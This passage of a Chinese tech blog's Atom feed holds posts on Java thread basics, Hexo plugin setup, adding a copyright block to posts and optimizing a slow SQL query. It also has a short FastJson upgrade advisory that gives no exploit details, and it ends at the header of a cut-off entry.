计数器：count5</span><br><span class="line">Thread-0 计数器：count4</span><br><span class="line">Thread-0 计数器：count7</span><br><span class="line">Thread-0 计数器：count3</span><br><span class="line">Thread-0 计数器：count2</span><br><span class="line">Thread-0 计数器：count1</span><br></pre></td></tr></table></figure><p>从上述结果可以看到，在main()主线程中，只有一个线程的运行结果。这是为什么呢，因为Thread 一旦被start() 就没法再次start()。若想同时启动多个 Thread 只能创建多个不同的Thread实例。但是多个不同Thread 实例中，资源是不共享的。</p><p><strong>本博客代码已托管到<a href="https://github.com/weechang/java-zero/tree/master/p2-java-thread/src/main/java/io/github/weechang/java/thread/implementThread" rel="external nofollow noopener noreferrer" target="_blank">github</a></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;p&gt;上一节，学习了Java多线程的基本概念，接下来就要正式进入多线程的学了。首先学习的是，在Java中如何实现一个多线程。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Java多线程" scheme="https://blog.weechang.xyz/categories/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
    
      <category term="Java多线程" scheme="https://blog.weechang.xyz/tags/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="Java" scheme="https://blog.weechang.xyz/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>【Java学习之从头开始】Java多线程-0——基础概念</title>
    <link href="https://blog.weechang.xyz/2018/09/30/java-thread-00-base/"/>
    <id>https://blog.weechang.xyz/2018/09/30/java-thread-00-base/</id>
    <published>2018-09-30T08:59:22.000Z</published>
    <updated>2018-09-30T09:31:59.507Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Java多线程，一直是Java里面一个绕不去的坎，对程序员的要求比较高。同时，得益于Java社区的日益强健，Java框架也随之丰富起来了，特别是Web框架。所以大多数做Web的程序员，都是拿来就用，我就是其中一员。Web中几乎不用程序员自身去操作多线程，所以这也就导致了大多数的Java Web程序员多线程方面较为薄弱。为了解决这一问题，下定决心学习Java多线程，同时记录自己的学习过程，以供日后翻阅。</p></blockquote><a id="more"></a><h1 id="线程与进程"><a href="#线程与进程" class="headerlink" title="线程与进程"></a>线程与进程</h1><p>线程与进程一直是相互关联，而又完全不同的两个概念。</p><p>其不同在于：</p><ul><li><p><strong>线程</strong>：同一类线程共享代码和数据空间，每个线程有独立的运行栈和程序计数器(PC)，线程切换开销小。（线程是cpu调度的最小单位）</p></li><li><p><strong>进程</strong>：每个进程都有独立的代码和数据空间（进程上下文），进程间的切换会有较大的开销，一个进程包含1–n个线程。（进程是资源分配的最小单位）</p></li></ul><p>其关联性在于：</p><p>1、一个进程可以有多个线程，但至少有一个线程；而一个线程只能在一个进程的地址空间内活动。</p><p>2、资源分配给进程，同一个进程的所有线程共享该进程所有资源。</p><p>3、CPU分配给线程，即真正在处理器运行的是线程。</p><p>4、线程在执行过程中需要协作同步，不同进程的线程间要利用消息通信的办法实现同步。</p><h1 id="线程的状态"><a href="#线程的状态" class="headerlink" title="线程的状态"></a>线程的状态</h1><p>Java中线程的状态分为五个阶段：</p><p>1、新建状态(New)： 线程对象被创建后，就进入了新建状态。例如，Thread thread = new Thread()。</p><p>2、就绪状态(Runnable)： 也被称为“可执行状态”。线程对象被创建后，其它线程调用了该对象的start()方法，从而来启动该线程。例如，thread.start()。处于就绪状态的线程，随时可能被CPU调度执行。</p><p>3、运行状态(Running)： 线程获取CPU权限进行执行。需要注意的是，线程只能从就绪状态进入到运行状态。</p><p>4、阻塞状态(Blocked)： 阻塞状态是线程因为某种原因放弃CPU使用权，暂时停止运行。直到线程进入就绪状态，才有机会转到运行状态。阻塞的情况分三种：</p><p>01) 等待阻塞 – 通过调用线程的wait()方法，让线程等待某工作的完成。</p><p>02) 同步阻塞 – 线程在获取synchronized同步锁失败(因为锁被其它线程所占用)，它会进入同步阻塞状态。</p><p>03) 其他阻塞 – 通过调用线程的sleep()或join()或发出了I/O请求时，线程会进入到阻塞状态。当sleep()状态超时、join()等待线程终止或者超时、或者I/O处理完毕时，线程重新转入就绪状态。</p><p>5、死亡状态(Dead)： 线程执行完了或者因异常退出了run()方法，该线程结束生命周期。</p><p>五种状态的转换关系如下：</p><p>更多关于线程的知识将在后续章节中，详细介绍，敬请期待……</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;p&gt;Java多线程，一直是Java里面一个绕不去的坎，对程序员的要求比较高。同时，得益于Java社区的日益强健，Java框架也随之丰富起来了，特别是Web框架。所以大多数做Web的程序员，都是拿来就用，我就是其中一员。Web中几乎不用程序员自身去操作多线程，所以这也就导致了大多数的Java Web程序员多线程方面较为薄弱。为了解决这一问题，下定决心学习Java多线程，同时记录自己的学习过程，以供日后翻阅。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Java多线程" scheme="https://blog.weechang.xyz/categories/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
    
      <category term="Java多线程" scheme="https://blog.weechang.xyz/tags/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="Java" scheme="https://blog.weechang.xyz/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>一个关于FastJson的高危漏洞</title>
    <link href="https://blog.weechang.xyz/2018/09/30/fastjson-bug/"/>
    <id>https://blog.weechang.xyz/2018/09/30/fastjson-bug/</id>
    <published>2018-09-29T16:12:22.000Z</published>
    <updated>2018-09-30T01:42:05.098Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>最近了解到一个关于FastJson的高危漏洞，在此列出来，给各位开发者提个醒。希望有用到该版本的开发者，及时升级版本，避免受到影响。</p></blockquote><a id="more"></a><p>具体漏洞情况如下，当FastJson版本低于1.2.49时，将json字符串泛解析为java对象的时候，在某些特定值的情况下。会导致长时间的阻塞（根据具体的CPU计算性能决定，时间长达几分钟）cup占用率飙升。</p><p>涉及到的地方包括：</p><ul><li>1.调用JSON.parseObject()方法。</li><li>2.使用@RequestBody 并且 HttpMessageConverter 为FastJson 的时候。</li></ul><p>且导致这一现象的代价微乎其微，效果堪比DDOS，由于该漏洞的具体细节，目前只是在小范围内传播，而且涉及范围过广，所以在此我也就不公布具体的漏洞细节了。</p><p>官方已在1.2.49及以后的版本中修复这一漏洞。</p><p><strong>希望有用到1.2.49以下版本的同学尽快升级</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;p&gt;最近了解到一个关于FastJson的高危漏洞，在此列出来，给各位开发者提个醒。希望有用到该版本的开发者，及时升级版本，避免受到影响。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Java" scheme="https://blog.weechang.xyz/categories/Java/"/>
    
    
      <category term="Java" scheme="https://blog.weechang.xyz/tags/Java/"/>
    
      <category term="FastJson高危漏洞" scheme="https://blog.weechang.xyz/tags/FastJson%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>说一说我所用到的hexo插件</title>
    <link href="https://blog.weechang.xyz/2018/09/29/hexo-plugins/"/>
    <id>https://blog.weechang.xyz/2018/09/29/hexo-plugins/</id>
    <published>2018-09-29T06:52:20.000Z</published>
    <updated>2018-09-29T09:20:15.213Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>在我之前的博文中，介绍了如何用hexo搭建一个自己的博客系统。当然只是简单地搭建，还有很多东西需要补全的。今天我就介绍下，hexo常用插件，以此来丰富你的博客功能、改善用户体验。</p></blockquote><a id="more"></a><p>关于如何使用hexo搭建自己的博客系统，感兴趣的同学可以看我之前的文章<a href="https:blog.weechang.xyz//2018/09/19/六元一个的私有博客系统，了解一下？/" target="_blank" rel="noopener">六元一个的私有博客系统，了解一下？</a>。</p><p>下面将详细介绍，我的博客中所使用到的一些hexo插件，丰富博客功能、改善用户体验。</p><h1 id="字数统计插件"><a href="#字数统计插件" class="headerlink" title="字数统计插件"></a>字数统计插件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-wordcount</span><br></pre></td></tr></table></figure><p>该插件能够做到统计每一篇文章的字数，以及预估阅读时间。但是如果自身的主题不支持的话，还得自己在主题中添加相关代码。如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;article-word-count&quot;&gt;</span><br><span class="line">&lt;span&gt;</span><br><span class="line">    &lt;i class=&quot;fas fa-file-word&quot;&gt;&lt;/i&gt;</span><br><span class="line">    共&lt;%= wordcount(post.content) %&gt;字，</span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;span&gt;</span><br><span class="line">    &lt;i class=&quot;fas fa-clock&quot;&gt;&lt;/i&gt;</span><br><span class="line">    大约需要&lt;%= min2read(post.content) %&gt;分钟</span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>添加后就能清楚地看到每篇博文的字数，及大概阅读用时了。</p><img src="/2018/09/29/hexo-plugins/wordcount.png" title="字数统计效果"><h1 id="sitemap-生成插件"><a href="#sitemap-生成插件" class="headerlink" title="sitemap 生成插件"></a>sitemap 生成插件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-sitemap</span><br></pre></td></tr></table></figure><p>该插件能够生成网站地图，供搜索引擎蜘蛛爬取所用。</p><h1 id="百度sitemap生成插件"><a href="#百度sitemap生成插件" class="headerlink" title="百度sitemap生成插件"></a>百度sitemap生成插件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-baidu-sitemap</span><br></pre></td></tr></table></figure><p>由于百度蜘蛛的sitemap编写规则与谷歌等有所不同，所以需要针对百度生成一个专门的sitemap，可以使用该插件</p><h1 id="RSS-源生成插件"><a href="#RSS-源生成插件" class="headerlink" title="RSS 源生成插件"></a>RSS 源生成插件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-feed</span><br></pre></td></tr></table></figure><p>值得注意的是，rss源生成查件不仅仅需要安装，还得配置。需要在你的项目 _config.yml 里面添加配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># RSS plugin</span><br><span class="line">plugin:</span><br><span class="line">- hexo-generator-feed</span><br><span class="line">#Feed Atom</span><br><span class="line">feed:</span><br><span class="line">type: atom</span><br><span class="line">path: atom.xml</span><br><span class="line">limit: 20</span><br></pre></td></tr></table></figure><h1 id="nofollow-插件"><a href="#nofollow-插件" class="headerlink" title="nofollow 插件"></a>nofollow 插件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-autonofollow</span><br></pre></td></tr></table></figure><p>nofollow 插件能够给所有非本站的超链接加上 nofollow 标签，nofollow 标签的意义在于 指示搜索引擎不要追踪（即抓取）网页上的带有nofollow属性的任何出站链接，以减少垃圾链接的分散网站权重！</p><p>同时，nofollow插件也需要配置才能生效，同样在你的项目 _config.yml 添加配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#nofollow not include</span><br><span class="line">nofollow:</span><br><span class="line">  enable: true</span><br><span class="line">  exclude:</span><br><span class="line">  - blog.unknowns.info</span><br><span class="line">  - yanhaijing.com</span><br><span class="line">  - 友链domain</span><br></pre></td></tr></table></figure><h1 id="百度URL主动提交插件"><a href="#百度URL主动提交插件" class="headerlink" title="百度URL主动提交插件"></a>百度URL主动提交插件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-baidu-url-submit</span><br></pre></td></tr></table></figure><p>百度url主动提交的意义在于，及时主动地向搜索引擎提交你站的新增文章url，对于搜索引擎的及时收录有一定的帮助。当然如果是一个高质量的老站，而且蜘蛛爬取频次很快的站的话，就当我没说过这句话吧。</p><p>需新增配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">baidu_url_submit:</span><br><span class="line">  # count表示一次提交几条最新的url</span><br><span class="line">  count: 1</span><br><span class="line">  host: 网站域名</span><br><span class="line">  token: 百度站长主动提交处得token</span><br><span class="line">  path: baidu_urls.txt</span><br></pre></td></tr></table></figure><p>token具体查看地址的，百度站长平台-用户中心-站点管理-数据引入-链接提交，token为图中token参数后面的值</p><img src="/2018/09/29/hexo-plugins/baiduurl.png" title="token"><p>另外需要，在修改 _config.yml 的deploy配置选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: baidu_url_submitter</span><br><span class="line">#  type: git</span><br><span class="line">  branch: master</span><br><span class="line">  repo:</span><br><span class="line">    coding: https://git.coding.net/weechang93/weechang93.coding.me.git</span><br><span class="line">    github: https://github.com/weechang/weechang.github.io.git</span><br><span class="line">  bucket: blog.weechang.xyz</span><br></pre></td></tr></table></figure><p><strong>其中deploy的type只能同时存在一个，这就需要在部署与提交url之间相互切换了。</strong></p><h1 id="静态资源压缩插件"><a href="#静态资源压缩插件" class="headerlink" title="静态资源压缩插件"></a>静态资源压缩插件</h1><p>静态资源压缩插件我知道的有两个，一个是全站压缩，一个是可选压缩，先说可选压缩的吧</p><h2 id="可选压缩"><a href="#可选压缩" class="headerlink" title="可选压缩"></a>可选压缩</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-neat</span><br></pre></td></tr></table></figure><p>需要在 _config.yml 增加配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># hexo-neat</span><br><span class="line"># 博文压缩</span><br><span class="line">neat_enable: true</span><br><span class="line"># 压缩html</span><br><span class="line">neat_html:</span><br><span class="line">  enable: true</span><br><span class="line">  exclude:</span><br><span class="line"># 压缩css</span><br><span class="line">neat_css:</span><br><span class="line">  enable: true</span><br><span class="line">  exclude:</span><br><span class="line">  - &apos;**/*.min.css&apos;</span><br><span class="line"># 压缩js</span><br><span class="line">neat_js:</span><br><span class="line">  enable: true</span><br><span class="line">  mangle: true</span><br><span class="line">  output:</span><br><span class="line">  compress:</span><br><span class="line">  exclude:</span><br><span class="line">  - &apos;**/*.min.js&apos;</span><br></pre></td></tr></table></figure><p>需要注意的是，css 及 js压缩需要排除掉已经压缩了的资源。另外需要压缩html就不能排除markdown的压缩。</p><h2 id="全站压缩"><a href="#全站压缩" class="headerlink" title="全站压缩"></a>全站压缩</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-all-minifier</span><br></pre></td></tr></table></figure><p>该插件不需要配置，而且不仅能压缩html、css、js 还能压缩图片。所以我选择了这个插件。</p><p>还有个问题就是，压缩就是为了节省空间，毕竟博客放的github或者coding。两者节点都不在大陆，所以网速是个大问题，这才是我选择后者的关键原因，后者没有版权注释，前者有版权注释，感觉注释也是一种浪费啊。不是说版权不重要。</p><p><strong>注意，用压缩插件的时候。如果markdown里面有 pre 标签写的代码的话，建议尽快修改。因为这两个压缩插件对于 pre标签里面的java泛型都不是很友好，都会报错。</strong></p><p>OK，我所用到的hexo插件就介绍到这儿，希望对你有所帮助。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;p&gt;在我之前的博文中，介绍了如何用hexo搭建一个自己的博客系统。当然只是简单地搭建，还有很多东西需要补全的。今天我就介绍下，hexo常用插件，以此来丰富你的博客功能、改善用户体验。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="开源之路" scheme="https://blog.weechang.xyz/categories/%E5%BC%80%E6%BA%90%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Hexo博客" scheme="https://blog.weechang.xyz/tags/Hexo%E5%8D%9A%E5%AE%A2/"/>
    
      <category term="hexo插件" scheme="https://blog.weechang.xyz/tags/hexo%E6%8F%92%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>为你的博客添加版权</title>
    <link href="https://blog.weechang.xyz/2018/09/28/%E4%B8%BA%E4%BD%A0%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E7%89%88%E6%9D%83/"/>
    <id>https://blog.weechang.xyz/2018/09/28/为你的博客添加版权/</id>
    <published>2018-09-28T06:48:37.000Z</published>
    <updated>2018-09-29T09:28:04.732Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>自己做自建博客也有一段时间了，有转载别人的博客，也有自己动手写博客。在没做独立博客之前，对版权意识并不是那么重视，也没了解过自己文章的收录情况。</p></blockquote><a id="more"></a><p>最近为了提高网站的收录量，开始将一些自己原创的博客放到oschina 等博客平台上去。但是发现自己的文章很快就被收录了，然后被别的权重较高的网站转载。结果就是自己辛辛苦苦写的文章为他人做了嫁衣，还没有自己的署名新。</p><p>于是开始研究为自己文章加上版权信息。人家的hexo博客主题都要自带的版权申明，奈何我的没有，于是只能自己写咯，谁让我要选择这个博客主题呢，谁让我要自己搞独立博客呢。</p><p>因为之前有过自己在博客主题里面添加信息的经历，所以此次添加就比较简单了。因为我的博客主题页面用的是Ejs模板写的，所以需要先写一个Ejs模板，模板主要写的就是版权的布局内容。</p><p>copyright.ejs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;% if (!index || !post.excerpt) &#123; %&gt;</span><br><span class="line">    &lt;div class=&quot;post-copyright&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;author&quot;&gt;</span><br><span class="line">            &lt;b&gt;本文作者： &lt;/b&gt;</span><br><span class="line">           post.author</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;link&quot;&gt;</span><br><span class="line">            &lt;b&gt;本文链接： &lt;/b&gt;</span><br><span class="line">            &lt;a href=&quot; &lt;%= post.permalink %&gt;&quot; target=&quot;_blank&quot;&gt; &lt;%= post.permalink %&gt; &lt;/a&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;copyright&quot;&gt;</span><br><span class="line">            &lt;b&gt; 版权声明： &lt;/b&gt;</span><br><span class="line">           本博客所有文章除特别声明外，均采用  &lt;a href=&quot;https://creativecommons.org/licenses/by-nc-sa/4.0/&quot;&gt;CC BY-NC-SA 4.0 &lt;/a&gt; 许可协议。转载请注明出处！</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>然后找到文章的布局模板,我是用的模板，文章布局模板文件是 article.ejs ，将 copyright.ejs 在你想要显示的地方插入。我是添加在文末，标签及分享按钮之前。所以插入位置如下</p><img src="/2018/09/28/为你的博客添加版权/插入.png" title="模板插入"><p>然后通过js文件调试自己的版权布局样式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">.post-copyright</span><br><span class="line">  padding: 20px</span><br><span class="line">  background: #F6F6F6</span><br><span class="line">  border-left: 4px solid #DDDDDD</span><br><span class="line">  line-height: 1.6rem</span><br></pre></td></tr></table></figure><p>Ok，大功告成。启动预览，点击文章。可以发现文章已经加入了版权信息，好开心啊。</p><p>这样人家的爬虫爬取你的文章的时候，就会加入你的定制版权信息了。就算转载了你的文章，也能在一定程度上增加你网站的外链。</p><p>另外，在自己原创文章发布后，可以立即向百度等搜索引擎提交自己的链接，这样对于收录也是有一定的好处的。</p><p><strong>另外，转载文章不留出处的方式，真的很恶心，希望大家都能尊重人家的劳动成果，加上署名及出处</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;p&gt;自己做自建博客也有一段时间了，有转载别人的博客，也有自己动手写博客。在没做独立博客之前，对版权意识并不是那么重视，也没了解过自己文章的收录情况。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="开源之路" scheme="https://blog.weechang.xyz/categories/%E5%BC%80%E6%BA%90%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Hexo博客" scheme="https://blog.weechang.xyz/tags/Hexo%E5%8D%9A%E5%AE%A2/"/>
    
      <category term="版权" scheme="https://blog.weechang.xyz/tags/%E7%89%88%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>记一次SQL优化</title>
    <link href="https://blog.weechang.xyz/2018/09/27/%E8%AE%B0%E4%B8%80%E6%AC%A1SQL%E4%BC%98%E5%8C%96/"/>
    <id>https://blog.weechang.xyz/2018/09/27/记一次SQL优化/</id>
    <published>2018-09-27T06:31:52.000Z</published>
    <updated>2018-09-29T07:47:11.418Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>最近收到项目的慢查询报警，刚好手上空下来了，就准备做一些优化。特开此贴记录一下此次的优化详情。</p></blockquote><a id="more"></a><h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>由于项目保密原因，因此很多字段采取保密写法，望各位看官见谅。</p><p>其实呢，整个表的数据量其实也不大，也就170W+。字段大概在65个左右，除了几个单号，几个内容这种稍大一点的字段外，其他的基本都是状态和关联id的字段。所以行大小也不大。</p><p>但是，上个月的时候，产品提出一个需要根据单号模糊查询的功能，就是这个功能，导致了慢查询。优化前，根据现有逻辑以及模糊查询的需求，大概的sql是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SELECT</span><br><span class="line">id,</span><br><span class="line">work_order_num AS workOrderNum,</span><br><span class="line">content,</span><br><span class="line">OTHERS_COLUMNS...</span><br><span class="line">FROM</span><br><span class="line">work_order</span><br><span class="line">WHERE</span><br><span class="line">work_order_num LIKE &apos;%201808221644820%&apos;</span><br><span class="line">AND sender_id = 11768</span><br><span class="line">AND status IN (2, 1, 0)</span><br><span class="line">AND record_status IN (4, 2)</span><br><span class="line">AND (locked = 0 OR locked = 2)</span><br><span class="line">AND yn = 1</span><br><span class="line">ORDER BY</span><br><span class="line">create_time DESC</span><br><span class="line">LIMIT 0, 10</span><br></pre></td></tr></table></figure><h1 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h1><p>其中，上述Sql中，条件中的字段 work_order_num、sender_id 都是建了索引的，以下是慢查询统计情况</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>total_count</td><td>19</td></tr><tr><td>total_time</td><td>133.23</td></tr><tr><td>avg_time</td><td>7.01</td></tr><tr><td>max_time</td><td>7.6426</td></tr><tr><td>avg_return_rows</td><td>0.79</td></tr><tr><td>max_return_rows</td><td>1</td></tr><tr><td>avg_examined_rows</td><td>1695975.47</td></tr><tr><td>max_examined_rows</td><td>1734740</td></tr></tbody></table><p>可以看见的是，慢查询基本都是全表扫描。为什么会这样呢，我具体执行了一下Sql发现，以上条件根本就查不出数据啊。然后修改条件发现，是工单号有问题。该工单号不存在，，，不存在啊。所以导致了全表扫描。</p><h1 id="调优进行时"><a href="#调优进行时" class="headerlink" title="调优进行时"></a>调优进行时</h1><p>首先想的是去掉like 特别是like的左匹配，试了一下，去掉左匹配，速度能减少到50%。虽然有效，但是业务不允许这样做。</p><p>然后考虑的是用instr函数代替like，测试了一下，能够减少1S的时间，但是对于7S的查询来说，这TM有什么效果。还是不行。</p><p>最后想到了一次案例分享中的，先用子查询查询出符合条件的id，再用id作为筛选条件，去获取所有的列。最后修改后的sql如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SELECT</span><br><span class="line">id,</span><br><span class="line">work_order_num AS workOrderNum,</span><br><span class="line">content,</span><br><span class="line">OTHERS_COLUMNS...</span><br><span class="line">FROM</span><br><span class="line">work_order</span><br><span class="line">WHERE</span><br><span class="line">id IN (</span><br><span class="line">SELECT</span><br><span class="line">id</span><br><span class="line">FROM</span><br><span class="line">ws_work_order</span><br><span class="line">WHERE</span><br><span class="line">work_order_num LIKE &apos;%201808221644820%&apos;</span><br><span class="line">AND sender_id = 11768</span><br><span class="line">AND STATUS IN (2, 1, 0)</span><br><span class="line">AND record_status IN (4, 2)</span><br><span class="line">AND (locked = 0 OR locked = 2)</span><br><span class="line">AND yn = 1</span><br><span class="line">)</span><br><span class="line">ORDER BY</span><br><span class="line">create_time DESC</span><br><span class="line">LIMIT 0, 10</span><br></pre></td></tr></table></figure><p>运行一下试试，，，果然，时间减少到了 0.03xxS。看着就有点小激动啊。</p><h1 id="原理剖析"><a href="#原理剖析" class="headerlink" title="原理剖析"></a>原理剖析</h1><p>原理呢，暂时忘了，先挖一个坑，等我想起了，再回来填坑。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;p&gt;最近收到项目的慢查询报警，刚好手上空下来了，就准备做一些优化。特开此贴记录一下此次的优化详情。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="日常记录" scheme="https://blog.weechang.xyz/categories/%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="日常记录" scheme="https://blog.weechang.xyz/tags/%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/"/>
    
      <category term="MySql" scheme="https://blog.weechang.xyz/tags/MySql/"/>
    
      <category term="Sql" scheme="https://blog.weechang.xyz/tags/Sql/"/>
    
  </entry>
  
  <entry>
    <title>论如何优雅地使用爬虫摸鱼</title>
    <link href="https://blog.weechang.xyz/2018/09/21/%E8%AE%BA%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E7%88%AC%E8%99%AB%E6%91%B8%E9%B1%BC/"/>
    <id>https://blog.weechang.xyz/2018/09/21/论如何优雅地使用爬虫摸鱼/</id>
    <published>2018-09-21T08:05:11.000Z</published>
    <updated>2018-09-30T07:29:08.343Z</updated>
    
